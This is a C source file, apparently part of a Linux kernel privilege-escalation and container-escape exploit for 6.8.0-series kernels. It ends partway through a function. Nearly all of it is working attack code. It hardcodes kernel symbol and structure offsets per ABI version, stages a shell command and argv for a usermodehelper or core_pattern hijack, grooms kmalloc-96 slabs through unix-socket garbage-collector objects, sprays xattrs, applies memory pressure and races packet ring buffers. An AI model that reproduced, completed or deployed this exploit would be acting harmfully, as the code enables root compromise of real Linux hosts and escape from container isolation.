#define _GNU_SOURCE

#include "xdk_kaslr.h"

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/futex.h>
#include <linux/kernel-page-flags.h>
#include <linux/memfd.h>
#include <linux/sockios.h>
#include <limits.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stddef.h>
#include <stdatomic.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/un.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <sys/xattr.h>
#include <time.h>
#include <unistd.h>

#ifndef SO_SNDBUF_FORCE
#define SO_SNDBUF_FORCE 32
#endif

#define ARRAY_SIZE(x) (sizeof(x) / sizeof((x)[0]))
#define GIB (1024ULL * 1024 * 1024)

static uint64_t g_off_data_page;
static uint64_t g_off_call_umh_work;
static uint64_t g_off_coredump_sysctls;
static uint64_t g_off_pkcs1_exit_tfm;
static uint64_t g_page_dgram_proto;
static uint64_t g_page_stream_slab;
static uint64_t g_page_stream_obj_size;
static uint64_t g_page_stream_owner;
static uint64_t g_page_unix_grouped_index;
static uint64_t g_page_unix_visited;
static uint64_t g_page_unix_max_scc_index;
static uint64_t g_page_unix_unvisited;
static uint64_t g_scratch_path;
static uint64_t g_scratch_dash_c;
static uint64_t g_scratch_command;
static uint64_t g_scratch_env_home;
static uint64_t g_scratch_env_path;
static uint64_t g_scratch_argv;
static uint64_t g_scratch_envp;
static uint64_t g_scratch_fake_alg;

static void die(const char *what) __attribute__((noreturn));

static void resolve_kernel_offsets(void)
{
	struct utsname uts;
	int abi;

	if (uname(&uts) != 0)
		die("uname");
	if (strncmp(uts.release, "6.8.0-", 6) != 0) {
		fprintf(stderr, "[-] unsupported kernel: %s\n", uts.release);
		_exit(2);
	}
	abi = atoi(uts.release + 6);
	fprintf(stderr, "[*] kernel ABI: %d\n", abi);

	g_off_data_page        = 0x29d0000UL;
	g_off_call_umh_work    = 0x12ec10UL;
	g_off_coredump_sysctls = 0x286fb40UL;
	g_off_pkcs1_exit_tfm   = 0x7a7750UL;
	g_page_dgram_proto        = 0x1c0UL;
	g_page_stream_slab        = 0x130UL;
	g_page_stream_obj_size    = 0x138UL;
	g_page_stream_owner       = 0x170UL;
	g_page_unix_grouped_index = 0x5c0UL;
	g_page_unix_visited       = 0x5d0UL;
	g_page_unix_max_scc_index = 0x5e0UL;
	g_page_unix_unvisited     = 0x5f0UL;
	g_scratch_path     = 0x840UL;
	g_scratch_dash_c   = 0x850UL;
	g_scratch_command  = 0x860UL;
	g_scratch_env_home = 0x980UL;
	g_scratch_env_path = 0x990UL;
	g_scratch_argv     = 0x9c0UL;
	g_scratch_envp     = 0xa00UL;
	g_scratch_fake_alg = 0xb00UL;

	switch (abi) {
	case 136:
	case 137:
		g_off_pkcs1_exit_tfm = 0x7a75c0UL;
		break;
	case 142:
		break;
	case 146:
		g_off_data_page        = 0x27cf000UL;
		g_off_call_umh_work    = 0x12def0UL;
		g_off_coredump_sysctls = 0x266ed80UL;
		g_off_pkcs1_exit_tfm   = 0x7a3610UL;
		g_page_dgram_proto        = 0x5a0UL;
		g_page_stream_slab        = 0x510UL;
		g_page_stream_obj_size    = 0x518UL;
		g_page_stream_owner       = 0x550UL;
		g_page_unix_grouped_index = 0x9e0UL;
		g_page_unix_visited       = 0x9f0UL;
		g_page_unix_max_scc_index = 0xa00UL;
		g_page_unix_unvisited     = 0xa10UL;
		g_scratch_path     = 0x7c0UL;
		g_scratch_dash_c   = 0x7d0UL;
		g_scratch_command  = 0x7e0UL;
		g_scratch_env_home = 0x8e0UL;
		g_scratch_env_path = 0x8f0UL;
		g_scratch_argv     = 0x920UL;
		g_scratch_envp     = 0x940UL;
		g_scratch_fake_alg = 0x100UL;
		break;
	default:
		fprintf(stderr, "[!] unknown ABI %d, trying 142 offsets\n", abi);
		break;
	}
	fprintf(stderr, "[*] pkcs1_exit_tfm offset: 0x%lx\n", g_off_pkcs1_exit_tfm);
	fprintf(stderr, "[*] data page offset: 0x%lx\n", g_off_data_page);
}

#define PROTO_CLOSE 0x000UL
#define PROTO_INUSE_IDX 0x0d8UL
#define PROTO_SLAB 0x150UL
#define PROTO_OBJ_SIZE 0x158UL
#define PROTO_OWNER 0x190UL

#define CRYPTO_ALG_REFCNT 0x034UL
#define CRYPTO_ALG_CRA_TYPE 0x138UL

enum {
	KERNEL_PAGE_SIZE = 0x1000,
	MIB = 1024 * 1024,
	SCM_FD_COUNT = 253,
	SMALL_SNDBUF = 1024,
	LARGE_SNDBUF = MIB,
	GC_FILLER_BATCHES = 8,
	STAGE2_DRAIN_BATCHES = 7,
	STAGE2_RESTORE_BATCHES = 6,
	STAGE2_COUNT = 2,
	ANON_RECLAIM_PAGES = 16384,
	SHMEM_RECLAIM_PAGES = 4096,
	RECLAIM_PIPE_COUNT = 1024,
	KMALLOC96_GROOM_SOCKET_COUNT = 512,
	KMALLOC96_FENCE_SOCKET_COUNT = 128,
	VERTEX_PREFILL_WORKERS_PER_CPU = 4,
	VERTEX_PREFILL_CPU_COUNT = 4,
	VERTEX_PREFILL_UID_BASE = 40000,
	GC_TRIGGER_UID = 49000,
	PRESSURE_TOUCH_THREAD_COUNT = 1,
	EDGE_XATTR_COUNT = 64,
	EDGE_XATTR_VALUE_SIZE = SCM_FD_COUNT * 48,
	UNIX_GROOM_ADDR_LEN = 80,
	EXPLOIT_ATTEMPT_COUNT = 6,
	PC_HIJACK_ATTEMPT_COUNT = 200,
	FIRST_GC_DELAY_USEC = 15,
	STAGE1_TIMEOUT_MSEC = 2000,
	PC_STALE_TIMEOUT_MSEC = 300,
	STAGE2_SPINUP_USEC = 5000,
	ROOT_TRIGGER_WAIT_USEC = 2000000,
	RETRY_DELAY_USEC = 100000,
	KASLR_LEAK_SAMPLE_COUNT = 200,
	KASLR_LEAK_TRIAL_COUNT = 31,
	DIRECT_MAP_LEAK_SAMPLE_COUNT = 60,
	DIRECT_MAP_LEAK_TRIAL_COUNT = 31,
	ORACLE_BATCH = 192,
	ORACLE_L1_TRIALS = 400,
	ORACLE_MAX_PFNS = 1 << 20,
	ORACLE_HIGH_PFN_START = 1 << 20,
	ORACLE_HIGH_PFNS = 1 << 19,
	RND_CACHE_COUNT = 16,
	UNIX_TEMPLATE_ADDR_LEN = 88,
	L1_CACHE_LINE = 64,
	L1_SET_COUNT = 64,
	ANCHORED_VERTEX_CANDIDATES = 2048,
	PACKET_RECLAIM_CANDIDATES = 1024,
	VERTEX_SHEAF_DRAIN_SENDERS = 16,
	VERTEX_SHEAF_DRAIN_PASSES = 1,
	PC_STAGE_GATE_MIB = 2000,
	PC_SAFE_GC_WAIT_USEC = 100000,
	PC_WATCH_TIMEOUT_USEC = 5000000,
	UNIX_VERTEX_ENTRY_OFFSET = 0x10,
	UNIX_VERTEX_SCC_OFFSET = 0x20,
	UNIX_VERTEX_OUT_DEGREE_OFFSET = 0x30,
	UNIX_VERTEX_INDEX_OFFSET = 0x38,
	UNIX_VERTEX_SCC_INDEX_OFFSET = 0x40,
	UNIX_EDGE_VERTEX_ENTRY_OFFSET = 0x10,
	UNIX_SOCK_STATE_OFFSET = 0x12,
	UNIX_SOCK_RECEIVE_QUEUE_OFFSET = 0xd8,
	UNIX_SOCK_SOCKET_OFFSET = 0x270,
	UNIX_SOCK_LISTENER_OFFSET = 0x358,
	UNIX_SOCK_VERTEX_OFFSET = 0x360,
	SOCKET_FILE_OFFSET = 0x10,
	FILE_REF_OFFSET = 0x18,
	SKB_SCM_FPL_OFFSET = 0x38,
	SKB_DESTRUCTOR_OFFSET = 0x60,
	SKB_REFDST_OFFSET = 0x58,
	SKB_HEAD_OFFSET = 0xc8,
	SKB_USERS_OFFSET = 0xdc,
	DST_RCUREF_OFFSET = 0x40,
	CTL_TABLE_CORE_PATTERN_MODE = 64 + 20,
	PC_UNIX_SOCK_OFFSET = 0x800,
	PC_SOCKET_OFFSET = 0xba0,
	PC_FILE_OFFSET = 0xc20,
	PC_SKB_OFFSET = 0xd00,
	THP_SIZE = 2 * MIB,
	NORMAL_ZONE_WINDOW_SIZE = 64 * MIB,

};

static const size_t mm_stall_length = 6000UL * MIB;

struct pressure_profile {
	size_t pressure;
	size_t prefilter_4k;
	size_t top_off;
};

static const struct pressure_profile low_first_profile = {
	.pressure = 0,
	.prefilter_4k = 0,
	.top_off = 1024UL * MIB,
};

static const struct pressure_profile high_first_profile = {
	.pressure = 0,
	.prefilter_4k = 0,
	.top_off = 1024UL * MIB,
};

static const struct pressure_profile low_retry_profile = {
	.pressure = 0,
	.prefilter_4k = 0,
	.top_off = 1024UL * MIB,
};

static const struct pressure_profile high_retry_profile = {
	.pressure = 0,
	.prefilter_4k = 0,
	.top_off = 1024UL * MIB,
};

static uint64_t attempt_cookie;
static unsigned int stage1_gc_delay_usec;
static unsigned int stage1_gc_delay_nsec;
static volatile sig_atomic_t escape_succeeded;
static volatile sig_atomic_t escape_shell_finished;
static size_t normal_zone_pressure;
static size_t normal_zone_prefilter_4k;
static size_t normal_zone_top_off;
static size_t edge_xattr_hole_index;
static volatile unsigned char *normal_zone_mapping;
static size_t normal_zone_mapping_size;
static volatile unsigned int oracle_cache_sink;
static size_t oracle_last_top[4];

static int *g_predrain_fds;
static volatile unsigned char **g_predrain_mappings;
static int g_predrain_count;
static int g_predrain_max;
static int g_predrain_ncpus;

static const unsigned int stage1_delay_schedule[EXPLOIT_ATTEMPT_COUNT] = {
	40, 40, 40, 40, 40, 40,
};

static void build_data_page_payload(volatile unsigned char *page,
				    uint64_t kbase);
static int create_root_trigger_socket(uint64_t kbase);
static uint64_t leak_xdk_kaslr_base(void);
static void resolve_kernel_offsets(void);
static void snapshot_rnd96(const char *label);
static uint64_t median_small(const uint64_t *values, size_t count);
static uint64_t oracle_trimmed_mean(uint64_t *values, size_t count);
static void *prepare_missing_region(size_t length);
static int force_vertex_slab_release(
	uint64_t pfn, int passed_fd,
	int prepared_senders[VERTEX_SHEAF_DRAIN_SENDERS],
	int prepared_peers[VERTEX_SHEAF_DRAIN_SENDERS]);

static void select_attempt_profile(bool low_profile, bool retry_pressure)
{
	const struct pressure_profile *profile;

	if (retry_pressure)
		profile = low_profile ?
			&low_retry_profile : &high_retry_profile;
	else
		profile = low_profile ?
			&low_first_profile : &high_first_profile;

	normal_zone_pressure = profile->pressure;
	normal_zone_prefilter_4k = profile->prefilter_4k;
	normal_zone_top_off = profile->top_off;
	edge_xattr_hole_index = low_profile ? 0 : EDGE_XATTR_COUNT - 1;
}

struct pressure_touch_ctx {
	volatile unsigned char *mapping;
	size_t start;
	size_t end;
	int cpu;
};

struct splice_ctx {
	int pipe_read;
	int sock;
	atomic_int ready;
	atomic_int done;
	pid_t tid;
	ssize_t ret;
	int err;
};

struct gc_close_ctx {
	int fd;
	int cpu;
	unsigned int delay;
	int value;
	int ret;
	int err;
	int flush_sender;
	int flush_pass_fd;
	bool flush_gc;
	bool prime_gc;
	atomic_int *wait_target;
	atomic_int *wake_target;
	atomic_int *monitor_sender;
	int sender_before_gc;
	int sender_after_gc;
	atomic_int ready;
	atomic_int go;
	atomic_int done;
};

struct stage2_ctx {
	int sock;
	int fds[SCM_FD_COUNT];
	int cpu;
	uid_t isolated_uid;
	int nice_value;
	bool sched_idle;
	void *fault_page;
	atomic_int *hold_after_send;
	atomic_int ready;
	atomic_int go;
	atomic_int entered;
	atomic_int done;
	pid_t tid;
	ssize_t ret;
	int err;
};

struct mm_stall_ctx {
	void *area;
	size_t length;
	atomic_int go;
	atomic_int ready;
	atomic_int done;
	pid_t tid;
	atomic_int *external_run;
	atomic_int *external_started;
	atomic_int *external_stop;
	int ret;
	int err;
};

struct mm_stall_worker {
	struct mm_stall_ctx *ctx;
	int cpu;
	int id;
};

struct edge_xattr_spray {
	int *fds;
	size_t count;
	int holder_fd;
};

struct rnd96_counts {
	unsigned long active[RND_CACHE_COUNT];
	unsigned long total[RND_CACHE_COUNT];
	unsigned long objects_per_slab[RND_CACHE_COUNT];
	unsigned long pages_per_slab[RND_CACHE_COUNT];
};

struct packet_page_anchor {
	int fd;
	volatile unsigned char *mapping;
	size_t length;
	size_t page_count;
	uint64_t pfn;
	uint64_t direct_map_address;
};

struct anchored_vertex {
	int holder[2];
	int (*candidate_pairs)[2];
	int (*filler_pairs)[2];
	size_t target_index;
	size_t queued_count;
	size_t filler_count;
	uint64_t address;
};

struct cache_geometry {
	size_t ways;
	size_t sets;
	size_t line_size;
};

struct cache_probe_set {
	volatile unsigned char *way[32];
};

struct stage2_proc_ctrl {
	atomic_int ready;
	atomic_int go;
	atomic_int send_go;
	atomic_int stall_ready;
	atomic_int stall_run;
	atomic_int stall_started;
	atomic_int hole_ready;
	atomic_int launch_go;
	atomic_int entered;
	atomic_int send_returned;
	atomic_int spray_go;
	atomic_int send_done;
	atomic_int trigger_go;
	atomic_int done;
	int ret;
	int err;
};

struct vertex_prefill_gate;

struct vertex_prefill_worker {
	struct vertex_prefill_gate *gate;
	atomic_int ready;
	atomic_int done;
	pthread_t thread;
	int sock[2];
	int predecessors[SCM_FD_COUNT];
	unsigned int id;
	int ret;
	int err;
};

struct vertex_prefill_gate {
	atomic_int go;
	int cpu;
	struct vertex_prefill_worker workers[VERTEX_PREFILL_WORKERS_PER_CPU];
};

static void futex_wait_zero(atomic_int *value);
static void pin_to_cpu(int cpu);
static void recv_and_close_fds(int sock, size_t expected);
static void gc_flush_barrier(int sender, int passed_fd);
static int make_unix_socketpair(int pair[2]);
static int send_one_fd_try(int sock, int fd, char byte);
static int read_rnd96_counts(struct rnd96_counts *counts);

/* V74: multi-threaded race sync + post-clear delay */
static volatile int g_race_ready;
/* V76: MOVABLE winner from thread mmap */
static volatile unsigned char *g_movable_winner;
static volatile int g_movable_winner_found;
/* V77: pre-mmap'd MOVABLE fault-in region */
static char *g_movable_region;
static int g_movable_region_pages;
/* V81: slab-cleared signal for threads to switch to MOVABLE fault-in */
static volatile int g_slab_cleared;

/* V112: pre-drain kmalloc-96 free list before anchor setup.
   Sends unique sockets via SCM_RIGHTS through disposable holders.
   Old holders stay alive -> unix_vertex objects remain allocated. */
#define DRAIN_MAX_HOLDERS 32
#define DRAIN_MAX_FDS 16384
static struct {
	int holders[DRAIN_MAX_HOLDERS][2];
	int fds[DRAIN_MAX_FDS];
	int n_holders;
	int n_fds;
} g_slab_drain;

static void predrain_kmalloc96(int cache_index)
{
	struct rnd96_counts counts;
	int send_buffer = LARGE_SNDBUF;
	int cur = 0;
	unsigned long free_objs, target;

	if (read_rnd96_counts(&counts) != 0)
		return;
	free_objs = counts.total[cache_index] -
		counts.active[cache_index];
	if (free_objs < 64) {
		printf("[D] V112 drain: skip free=%lu\n", free_objs);
		fflush(stdout);
		return;
	}
	target = free_objs + 512;
	if (target > DRAIN_MAX_FDS)
		target = DRAIN_MAX_FDS;
	if (make_unix_socketpair(g_slab_drain.holders[0]) != 0)
		return;
	setsockopt(g_slab_drain.holders[0][0], SOL_SOCKET,
		SO_SNDBUF_FORCE, &send_buffer, sizeof(send_buffer));
	setsockopt(g_slab_drain.holders[0][0], SOL_SOCKET,
		SO_SNDBUF, &send_buffer, sizeof(send_buffer));

	for (unsigned long d = 0; d < target; d++) {
		int fd = socket(AF_UNIX,
			SOCK_DGRAM | SOCK_CLOEXEC, 0);
		if (fd < 0) break;
		g_slab_drain.fds[g_slab_drain.n_fds] = fd;
		if (send_one_fd_try(
			g_slab_drain.holders[cur][0],
			fd, 'D') != 0) {
			if (errno != EAGAIN) {
				close(fd);
				break;
			}
			cur++;
			if (cur >= DRAIN_MAX_HOLDERS) {
				close(fd);
				break;
			}
			if (make_unix_socketpair(
				g_slab_drain.holders[cur]) != 0) {
				close(fd);
				break;
			}
			setsockopt(
				g_slab_drain.holders[cur][0],
				SOL_SOCKET, SO_SNDBUF_FORCE,
				&send_buffer, sizeof(send_buffer));
			setsockopt(
				g_slab_drain.holders[cur][0],
				SOL_SOCKET, SO_SNDBUF,
				&send_buffer, sizeof(send_buffer));
			if (send_one_fd_try(
				g_slab_drain.holders[cur][0],
				fd, 'D') != 0) {
				close(fd);
				break;
			}
		}
		g_slab_drain.n_fds++;
	}
	g_slab_drain.n_holders = cur + 1;
	printf("[D] V112 drain: %d objs via %d holders"
		" (was %lu free)\n",
		g_slab_drain.n_fds,
		g_slab_drain.n_holders,
		free_objs);
	fflush(stdout);
}

struct race_thread_arg {
	int cpu;
	volatile int *go;
	volatile int *stop;
	int fd_used;
	int fd_ok;
	int fd_start;
	int fd_limit;
	int mov_start;
	int mov_limit;
	int mov_used;
};

static void *race_thread_fn(void *varg)
{
	struct race_thread_arg *a = varg;
	struct tpacket_req req = {
		.tp_block_size = KERNEL_PAGE_SIZE,
		.tp_block_nr = 1,
		.tp_frame_size = KERNEL_PAGE_SIZE,
		.tp_frame_nr = 1,
	};

	pin_to_cpu(a->cpu);
	a->mov_used = 0;
	a->fd_ok = 0;

	while (!__atomic_load_n(a->go, __ATOMIC_ACQUIRE))
		__asm__ volatile("pause" ::: "memory");

	__atomic_fetch_add(&g_race_ready, 1, __ATOMIC_RELEASE);

	while (!__atomic_load_n(a->stop, __ATOMIC_ACQUIRE)) {
		if (a->fd_used < a->fd_limit) {
			int idx = a->fd_start + a->fd_used;
			if (setsockopt(g_predrain_fds[idx], SOL_PACKET,
				       PACKET_RX_RING, &req,
				       sizeof(req)) == 0)
				a->fd_ok++;
			a->fd_used++;
		}
		if (a->fd_used >= a->fd_limit)
			break;
	}

	return NULL;
}

struct fast_capture_arg {
	int cpu;
	volatile int *go;
	volatile int *stop;
	volatile int *found;
	int *fds;
	int fd_count;
	int idx;
	int pagemap_fd;
	uint64_t target_pfn;
	void *captured_map;
	int captured_fd_idx;
	int create_socks;
	int created_ok;
	volatile int *ready_cnt;
};

static void *fast_capture_fn(void *varg)
{
	struct fast_capture_arg *a = varg;
	struct tpacket_req req;
	pin_to_cpu(a->cpu);

	if (a->create_socks) {
		int j, ok = 0;
		for (j = 0; j < a->fd_count; j++) {
			a->fds[j] = socket(AF_PACKET,
				SOCK_DGRAM | SOCK_CLOEXEC, 0);
			if (a->fds[j] >= 0)
				ok++;
			else {
				a->fd_count = j;
				break;
			}
		}
		a->created_ok = ok;
		if (a->ready_cnt)
			__atomic_fetch_add(a->ready_cnt, 1,
					   __ATOMIC_RELEASE);
	}

	a->idx = 0;
	a->captured_map = NULL;
	a->captured_fd_idx = -1;

	req.tp_block_size = KERNEL_PAGE_SIZE;
	req.tp_block_nr   = 1;
	req.tp_frame_size = KERNEL_PAGE_SIZE;
	req.tp_frame_nr   = 1;

	while (!__atomic_load_n(a->go, __ATOMIC_ACQUIRE))
		__asm__ volatile("pause" ::: "memory");

	while (!__atomic_load_n(a->stop, __ATOMIC_ACQUIRE) &&
	       a->idx < a->fd_count) {
		int fd = a->fds[a->idx];
		if (setsockopt(fd, SOL_PACKET, PACKET_RX_RING,
			       &req, sizeof(req)) != 0) {
			a->fds[a->idx] = -1;
		}
		a->idx++;
	}

	return NULL;
}

static void die(const char *what)
{
	perror(what);
	_exit(1);
}

static void fail(const char *what)
{
	fprintf(stderr, "[-] %s\n", what);
	_exit(1);
}

static void sleep_usec(unsigned int usec)
{
	struct timespec req = {
		.tv_sec = usec / 1000000,
		.tv_nsec = (long)(usec % 1000000) * 1000,
	};

	while (nanosleep(&req, &req) != 0 && errno == EINTR)
		;
}

static void escape_signal_handler(int signal_number)
{
	if (signal_number == SIGUSR1)
		escape_succeeded = 1;
	else if (signal_number == SIGUSR2)
		escape_shell_finished = 1;
}

static bool wait_for_escape_signal(unsigned int timeout_usec)
{
	const unsigned int interval_usec = 10000;
	unsigned int waited = 0;

	while (!escape_succeeded && waited < timeout_usec) {
		sleep_usec(interval_usec);
		waited += interval_usec;
	}
	return escape_succeeded != 0;
}

static void futex_wait_zero(atomic_int *value)
{
	while (!atomic_load_explicit(value, memory_order_acquire)) {
		if (syscall(SYS_futex, value, FUTEX_WAIT, 0, NULL, NULL, 0) < 0 &&
		    errno != EAGAIN && errno != EINTR)
			die("futex wait");
	}
}

static void futex_set(atomic_int *value)
{
	atomic_store_explicit(value, 1, memory_order_release);
	if (syscall(SYS_futex, value, FUTEX_WAKE, INT_MAX, NULL, NULL, 0) < 0)
		die("futex wake");
}

static void busy_wait_usec(unsigned int usec)
{
	struct timespec start, now;
	uint64_t target = (uint64_t)usec * 1000;
	uint64_t elapsed;

	if (clock_gettime(CLOCK_MONOTONIC, &start) != 0)
		die("clock_gettime");
	do {
		if (clock_gettime(CLOCK_MONOTONIC, &now) != 0)
			die("clock_gettime");
		elapsed = (uint64_t)(now.tv_sec - start.tv_sec) * 1000000000ULL;
		elapsed += (uint64_t)(now.tv_nsec - start.tv_nsec);
	} while (elapsed < target);
}

static __attribute__((unused)) void busy_wait_nsec(unsigned int nsec)
{
	struct timespec start, now;
	uint64_t elapsed;

	if (clock_gettime(CLOCK_MONOTONIC, &start) != 0)
		die("clock_gettime");
	do {
		if (clock_gettime(CLOCK_MONOTONIC, &now) != 0)
			die("clock_gettime");
		elapsed = (uint64_t)(now.tv_sec - start.tv_sec) * 1000000000ULL;
		elapsed += (uint64_t)(now.tv_nsec - start.tv_nsec);
	} while (elapsed < nsec);
}

static uint64_t monotonic_nsec(void)
{
	struct timespec now;

	if (clock_gettime(CLOCK_MONOTONIC, &now) != 0)
		die("clock_gettime");
	return (uint64_t)now.tv_sec * 1000000000ULL + now.tv_nsec;
}

static uint64_t timing_started;
static const char *requested_poc_mode;

static void timing_mark(const char *label)
{
	printf("[T] %8.3f ms %s\n",
	       (double)(monotonic_nsec() - timing_started) / 1e6, label);
}

static bool poc_mode_is(const char *mode)
{
	return requested_poc_mode && strcmp(requested_poc_mode, mode) == 0;
}

static void pin_to_cpu(int cpu)
{
	cpu_set_t set;

	CPU_ZERO(&set);
	CPU_SET(cpu, &set);
	if (sched_setaffinity(0, sizeof(set), &set) != 0)
		die("sched_setaffinity");
}

static __attribute__((unused)) void pin_thread_to_cpu(pid_t tid, int cpu)
{
	cpu_set_t set;

	CPU_ZERO(&set);
	CPU_SET(cpu, &set);
	if (sched_setaffinity(tid, sizeof(set), &set) != 0)
		die("sched_setaffinity thread");
}

static void raise_nofile_limit(void)
{
	struct rlimit lim;

	if (getrlimit(RLIMIT_NOFILE, &lim) != 0)
		die("getrlimit");
	lim.rlim_cur = lim.rlim_max;
	if (setrlimit(RLIMIT_NOFILE, &lim) != 0)
		die("setrlimit");
	printf("[D] RLIMIT_NOFILE: cur=%llu max=%llu\n",
		(unsigned long long)lim.rlim_cur,
		(unsigned long long)lim.rlim_max);

	struct rlimit ml;
	if (getrlimit(RLIMIT_MEMLOCK, &ml) == 0) {
		printf("[D] RLIMIT_MEMLOCK before: cur=%llu max=%llu\n",
			(unsigned long long)ml.rlim_cur,
			(unsigned long long)ml.rlim_max);
		ml.rlim_cur = ml.rlim_max;
		setrlimit(RLIMIT_MEMLOCK, &ml);
		struct rlimit ml2 = { .rlim_cur = 1ULL << 30,
				      .rlim_max = 1ULL << 30 };
		if (setrlimit(RLIMIT_MEMLOCK, &ml2) == 0)
			ml = ml2;
		printf("[D] RLIMIT_MEMLOCK after:  cur=%llu\n",
			(unsigned long long)ml.rlim_cur);
	}
	fflush(stdout);
}

static void *pressure_touch_worker(void *arg)
{
	struct pressure_touch_ctx *ctx = arg;
	size_t offset;

	pin_to_cpu(ctx->cpu);
	for (offset = ctx->start; offset < ctx->end; offset += KERNEL_PAGE_SIZE)
		ctx->mapping[offset] = 1;
	return NULL;
}

static void allocate_normal_zone_pressure(size_t length, bool use_thp,
					  bool populate_write)
{
	volatile unsigned char *pressure;

	if (!length)
		return;
	pressure = mmap(NULL, length,
			PROT_READ | PROT_WRITE,
			MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (pressure == MAP_FAILED)
		die("mmap normal-zone pressure");
	if (madvise((void *)pressure, length,
		    use_thp ? MADV_HUGEPAGE : MADV_NOHUGEPAGE) != 0)
		die("madvise normal-zone pressure");
	if (madvise((void *)pressure, length, MADV_DONTFORK) != 0)
		die("madvise normal-zone pressure DONTFORK");
	if (populate_write) {
		if (madvise((void *)pressure, length, MADV_POPULATE_WRITE) != 0)
			die("madvise normal-zone pressure POPULATE_WRITE");
	} else {
		struct pressure_touch_ctx workers[PRESSURE_TOUCH_THREAD_COUNT];
		pthread_t threads[PRESSURE_TOUCH_THREAD_COUNT];
		size_t chunk = (length / PRESSURE_TOUCH_THREAD_COUNT) &
			~(KERNEL_PAGE_SIZE - 1);

		for (int worker = 0;
		     worker < PRESSURE_TOUCH_THREAD_COUNT; worker++) {
			workers[worker].mapping = pressure;
			workers[worker].start = worker * chunk;
			workers[worker].end =
				worker + 1 == PRESSURE_TOUCH_THREAD_COUNT ?
				length : (worker + 1) * chunk;
			workers[worker].cpu = worker % 2;
			if (pthread_create(&threads[worker], NULL,
					   pressure_touch_worker,
					   &workers[worker]) != 0)
				die("pthread_create pressure touch");
		}
		for (int worker = 0;
		     worker < PRESSURE_TOUCH_THREAD_COUNT; worker++)
			pthread_join(threads[worker], NULL);
		pin_to_cpu(0);
	}

	/*
	 * Keep every pressure mapping resident, but open the reclaim window from
	 * the latest order-0 mapping when a THP pre-pressure phase is followed by
	 * a 4K top-off.
	 */
	if (!use_thp || !normal_zone_mapping) {
		normal_zone_mapping = pressure;
		normal_zone_mapping_size = length;
	}
}

static void exhaust_normal_zone(void)
{
	allocate_normal_zone_pressure(normal_zone_pressure, false, false);
	allocate_normal_zone_pressure(normal_zone_prefilter_4k, false, false);
}

static void top_off_normal_zone(void)
{
	allocate_normal_zone_pressure(normal_zone_top_off, false, false);
}

static void open_normal_zone_window(void)
{
	size_t length;

	if (!normal_zone_mapping)
		fail("Normal-zone pressure window has no backing mapping");
	length = normal_zone_mapping_size < NORMAL_ZONE_WINDOW_SIZE ?
		normal_zone_mapping_size : NORMAL_ZONE_WINDOW_SIZE;
	if (!length)
		return;
	if (madvise((void *)normal_zone_mapping, length,
		    MADV_DONTNEED) != 0)
		die("madvise Normal-zone pressure window");
}

static void prepare_edge_xattr_spray(struct edge_xattr_spray *spray)
{
	unsigned char *holder_value;
	char holder_path[64];
	size_t i;

	holder_value = calloc(1, EDGE_XATTR_VALUE_SIZE);
	spray->fds = calloc(EDGE_XATTR_COUNT, sizeof(*spray->fds));
	if (!holder_value || !spray->fds)
		die("allocate edge xattr spray");
	for (i = 0; i < EDGE_XATTR_COUNT; i++) {
		snprintf(holder_path, sizeof(holder_path),
			 "/dev/shm/edge-spray-%d-%zu", getpid(), i);
		spray->fds[i] = open(
			holder_path, O_CREAT | O_EXCL | O_RDWR | O_CLOEXEC, 0600);
		if (spray->fds[i] < 0)
			die("open edge xattr spray");
		unlink(holder_path);
		if (fsetxattr(spray->fds[i], "user.edge-hole",
			      holder_value, EDGE_XATTR_VALUE_SIZE, 0) != 0)
			die("fsetxattr edge xattr spray");
	}
	spray->count = EDGE_XATTR_COUNT;
	spray->holder_fd = spray->fds[edge_xattr_hole_index];
	free(holder_value);
}

static void free_edge_xattr_hole(struct edge_xattr_spray *spray)
{
	if (spray->holder_fd < 0)
		return;
	if (fremovexattr(spray->holder_fd, "user.edge-hole") != 0)
		die("fremovexattr edge-hole holder");
}

static void groom_kmalloc96_slabs(void)
{
	struct sockaddr_un address;
	int *sockets;
	size_t i;

	sockets = calloc(KMALLOC96_GROOM_SOCKET_COUNT, sizeof(*sockets));
	if (!sockets)
		die("calloc kmalloc-96 groom");

	pin_to_cpu(0);
	for (i = 0; i < KMALLOC96_GROOM_SOCKET_COUNT; i++) {
		memset(&address, 0, sizeof(address));
		address.sun_family = AF_UNIX;
		memcpy(&address.sun_path[1], &i, sizeof(i));
		memcpy(&address.sun_path[1 + sizeof(i)], &attempt_cookie,
		       sizeof(attempt_cookie));
		sockets[i] = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
		if (sockets[i] < 0)
			die("socket kmalloc-96 groom");
		if (bind(sockets[i], (struct sockaddr *)&address,
			 UNIX_GROOM_ADDR_LEN) != 0)
			die("bind kmalloc-96 groom");
	}
}

static void hold_kmalloc96_fence(
	int sockets[KMALLOC96_FENCE_SOCKET_COUNT])
{
	struct sockaddr_un address;
	size_t i;

	pin_to_cpu(0);
	for (i = 0; i < KMALLOC96_FENCE_SOCKET_COUNT; i++) {
		uint64_t id = 0xf3ce000000000000ULL | i;

		memset(&address, 0, sizeof(address));
		address.sun_family = AF_UNIX;
		memcpy(&address.sun_path[1], &id, sizeof(id));
		memcpy(&address.sun_path[1 + sizeof(id)], &attempt_cookie,
		       sizeof(attempt_cookie));
		sockets[i] = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
		if (sockets[i] < 0)
			die("socket kmalloc-96 fence");
		if (bind(sockets[i], (struct sockaddr *)&address,
			 UNIX_GROOM_ADDR_LEN) != 0)
			die("bind kmalloc-96 fence");
	}
	pin_to_cpu(0);
}

static int make_unix_socketpair(int pair[2])
{
	return socketpair(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0, pair);
}

static __attribute__((unused)) void prepare_embryo_client(int listener, int *client,
				  unsigned int cookie)
{
	struct sockaddr_un address;
	socklen_t length = offsetof(struct sockaddr_un, sun_path) + 17;

	memset(&address, 0, sizeof(address));
	address.sun_family = AF_UNIX;
	address.sun_path[0] = '\0';
	memcpy(&address.sun_path[1], "80521-listener", 14);
	if (cookie == 1) {
